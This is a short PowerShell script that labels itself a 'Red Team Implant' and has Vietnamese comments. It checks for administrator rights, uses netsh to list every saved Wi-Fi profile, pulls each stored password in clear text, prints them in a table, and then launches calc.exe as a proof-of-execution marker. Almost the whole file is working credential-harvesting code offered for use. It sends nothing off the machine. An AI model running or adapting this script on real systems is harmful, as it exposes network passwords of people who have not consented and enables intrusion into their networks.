Write-Host "Hello World from Kushy Red Team Implant"

function Test-IsElevated {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $p  = New-Object Security.Principal.WindowsPrincipal($id)
    return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Get-WifiCredentials {
    if (-not (Test-IsElevated)) {
        Write-Warning "Requires Administrator privileges to reveal Key Content. Run PowerShell as Administrator."
        return @()
    }

    # Lấy toàn bộ output trước, tránh pipe trực tiếp để dễ debug
    $allProfilesRaw = netsh wlan show profiles 2>&1
    if (-not $allProfilesRaw) {
        Write-Verbose "netsh returned no output. Check wireless adapter or netsh availability."
        return @()
    }

    # Tìm các dòng chứa tên profile bằng regex (bắt cả 'All User Profile' hoặc 'Profile')
    $profiles = @()
    foreach ($line in $allProfilesRaw) {
        $m = [regex]::Match($line, 'All User Profile\s*:\s*(.+)$', 'IgnoreCase')
        if (-not $m.Success) { $m = [regex]::Match($line, 'Profile\s*:\s*(.+)$', 'IgnoreCase') }
        if ($m.Success) { $profiles += $m.Groups[1].Value.Trim() }
    }

    if (-not $profiles) {
        Write-Host "No WLAN profiles found. Here is raw output for analysis:"
        $allProfilesRaw | Out-Host
        return @()
    }

    $results = foreach ($p in $profiles) {
        # Lấy chi tiết profile vào biến, rồi parse an toàn
        $detail = netsh wlan show profile name="$p" key=clear 2>&1
        $pw = $null
        foreach ($l in $detail) {
            $m2 = [regex]::Match($l, 'Key Content\s*:\s*(.+)$', 'IgnoreCase')
            if ($m2.Success) { $pw = $m2.Groups[1].Value.Trim(); break }

            # fallback: try language-agnostic parse if contains colon and keyword
            if ($l -match ':' -and ($l -match 'Key|Content|Nội|Schlüssel|Clave')) {
                $seg = ($l -split ':')[-1].Trim()
                if ($seg) { $pw = $seg; break }
            }
        }

        [PSCustomObject]@{
            ProfileName = $p
            Password    = if ($pw) { $pw } else { 'N/A' }
        }
    }

    return $results
}

# RUN: in hoặc export kết quả để kiểm tra
$credentials = Get-WifiCredentials
if ($credentials) {
    $credentials | Format-Table -AutoSize
} else {
    Write-Host "No credentials returned. See messages above for hints."
}

Start-Process calc.exe
